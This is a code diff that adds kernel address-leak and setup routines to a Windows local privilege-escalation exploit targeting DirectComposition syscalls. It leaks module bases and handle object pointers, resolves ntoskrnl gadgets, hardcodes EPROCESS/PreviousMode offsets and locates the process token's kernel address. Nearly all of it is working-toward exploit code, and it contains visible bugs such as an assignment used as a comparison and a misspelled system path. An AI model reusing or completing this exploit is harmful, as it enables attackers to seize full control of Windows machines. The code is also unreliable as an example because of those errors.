@@ -50,9 +50,9 @@ typedef NTSTATUS(*pNtDCompositionCreateChannel)(
 typedef NTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
     IN HANDLE hChannel,
     IN DWORD dwArgStart,
-    OUT PDWORD pOutArg1,
-    OUT PDWORD pOutArg2
-    );
+OUT PDWORD pOutArg1,
+OUT PDWORD pOutArg2
+);
 
 typedef NTSTATUS(*pNtDCompositionCommitChannel)(
     IN HANDLE pArgChannelHandle,
@@ -107,16 +107,50 @@ pNtDCompositionCreateChannel NtDCompositionCreateChannel;
 pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
 pNtDCompositionCommitChannel NtDCompositionCommitChannel;
 
+
+HMODULE GetNOSModule() {
+    HMODULE hKern = 0;
+    hKern = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
+    return hKern;
+}
+
 DWORD64 GetModuleAddr(const char* name) {
     PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);
     DWORD outBuffer = 0;
     NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
+    
+    if (status = STATUS_INFO_LENGTH_MISMATCH) {
+        free(buffer);
+        buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
+        status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
+        if (status == STATUS_ACCESS_DENIED) {
+            return 0;
+        }
+    }
+
+    for (int i = 0; i < buffer->NumberOfModules; i++) {
+        DWORD kernelImageBase = (DWORD)buffer->Modules[i].ImageBase;
+        PCHAR kernelImage = (PCHAR)buffer->Modules[i].FullPathName;
+        if (!_stricmp(kernelImage, name)) {
+            free(buffer);
+            return kernelImageBase;
+        }
+    }
+    free(buffer);
     return 0;
 }
 
 DWORD64 GetGadgetAddr(const char* name) {
     DWORD64 base = GetModuleAddr("\\SymtemRoot\\system32\\ntoskrnl.exe");
-    return 0;
+    HMODULE mod = GetNOSModule();
+    if (!mod) {
+        printf("[-] leaking ntoskrnl version\n");
+        return 0;
+    }
+    DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
+    DWORD64 returnValue = base + offset - (DWORD64)mod;
+    FreeLibrary(mod);
+    return returnValue;
 }
 
 SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object) {
@@ -126,6 +160,82 @@ SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object) {
     NTSTATUS status;
     SIZE_T kernelAddress = 0;
     BOOL bFind = FALSE;
+    return 0;
+}
+
+SIZE_T GetObjKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE obj) {
+
+
+    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
+    ULONG handleInfoSize = 0x10000;
+    ULONG retLength = 0;
+    NTSTATUS status = 0;
+    SIZE_T kernelAddress = 0;
+    BOOL bFind = FALSE;
+
+    while (TRUE) {
+        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
+        status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
+        if (status == STATUS_INFO_LENGTH_MISMATCH || NT_SUCCESS(status)) {
+            LocalFree(handleInfo);
+
+            handleInfoSize = retLength + 0x100;
+            handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
+            status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
+            if (NT_SUCCESS(status)) {
+                for (int i = 0; i < handleInfo->NumberOfHandles; i++) {
+                    if ((USHORT)obj == 0x4) {
+                        if (0x4 == handleInfo->Handles[i].UniqueProcessId && (SIZE_T)handleInfo->Handles[i].HandleValue) {
+                            kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
+                            bFind = TRUE;
+                            break;
+                        }
+                    }
+                    else {
+                        if ((DWORD)GetCurrentProcess() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)handleInfo->Handles[i].HandleValue) {
+                            kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
+                            bFind = TRUE;
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+        if (handleInfo)
+            LocalFree(handleInfo);
+        if (bFind)
+            break;
+    }
+    return kernelAddress;
+
+}
+
+DWORD64 GetKernelPointer(HANDLE handle, DWORD type) {
+    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);
+    DWORD outBuffer = 0;
+    NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
+    if ( status == STATUS_INFO_LENGTH_MISMATCH) {
+        free(buffer);
+        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
+        status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
+    }
+    
+    if (!buffer) {
+        printf("[-] NtQueryInformation error\n");
+        return 0;
+    }
+
+    for (int i = 0; i < buffer->NumberOfHandles; i++) {
+        DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex;
+        
+        if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type) {
+            DWORD64 object = (DWORD64)buffer->Handles[i].Object;
+            free(buffer);
+            return object;
+        }
+    }
+    printf("[-] handle not found\n");
+    free(buffer);
     return 0;
 }
 
@@ -139,8 +249,15 @@ BOOL InitEnvironment() {
         !DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &g_pExploitCtx->hCurThreadHandle, 0, FALSE, DUPLICATE_SAME_ACCESS))
         return FALSE;
 
+    g_pExploitCtx->dwKernelEprocessAddr = GetObjectKernelAddress(g_pExploitCtx, g_pExploitCtx->hCurProcessHandle);
+    g_pExploitCtx->dwKernelEthreadAddr = GetObjectKernelAddress(g_pExploitCtx, g_pExploitCtx->hCurThreadHandle);
     
+    g_pExploitCtx->win32_process_offset = 0x508;
+    g_pExploitCtx->previous_mode_offset = 0x232;
+    g_pExploitCtx->GadgetAddrOffset = 0x38;
+    g_pExploitCtx->ObjectSize = 0x1d0;
 
+    return TRUE;
 }
 
 int main(int argc, TCHAR* argv[])
@@ -149,8 +266,25 @@ int main(int argc, TCHAR* argv[])
         printf("[-]Inappropriate Operating System\n");
         return 0;
     }
+
     LoadLibrary(L"user32.dll");
+
+    DWORD64* Ptr = (DWORD64*)0xffffffff;
     DWORD64 GadgetAddr = GetGadgetAddr("SeSetAccessStateGenericMapping");
+    //memset(Ptr, 0xff, 0x1000);
+
+    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
+    if (!proc) {
+        printf("[-] OpenProcess fail\n");
+        return 0;
+    }
+    HANDLE token = 0;
+    if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token)) {
+        printf("[-] OpenProcessToken fail\n");
+        return 0;
+    }
+
+    DWORD64 kToken = GetKernelPointer(token, 0x5);
     NTSTATUS ntStatus;
     HMODULE win32u = LoadLibrary(L"win32u.dll");
     NtDCompositionCreateChannel = (pNtDCompositionCreateChannel)GetProcAddress(win32u, "NtDCompositionCreateChannel");
